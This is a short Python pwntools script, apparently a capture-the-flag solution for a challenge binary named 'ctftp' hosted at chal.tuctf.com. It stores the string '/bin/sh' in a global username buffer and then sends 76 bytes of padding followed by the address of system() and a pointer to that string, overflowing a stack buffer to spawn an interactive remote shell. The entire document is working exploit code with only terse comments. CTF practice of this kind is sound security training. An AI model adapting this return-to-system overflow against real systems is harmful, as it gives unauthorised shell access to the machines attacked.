#!/usr/bin/python3

from pwn import *

def main():
    #target = process("./ctftp")
    target = remote("chal.tuctf.com", 30500)

    prompt = target.recvuntil(b"Enter your name: ")
    print(prompt)

    # Set username to string "/bin/sh"
    # 0x804c080 <username>:   0x61616161      0x00000000      0x00000000      0x00000000
    target.sendline(b"/bin/sh")
    target.recvuntil(b"> ")

    target.sendline(b"2")
    target.recvuntil(b"Enter filename: ")

    # 0x080490b0    1 6            sym.imp.system
    overflow = b"A"*76
    overflow += p32(0x080490b0) # eip system()
    overflow += b"DUMM"
    overflow += p32(0x0804c080) # "/bin/sh"

    # trigger stack buffer overflow for system("/bin/sh")
    target.sendline(overflow)
    target.interactive()

main()
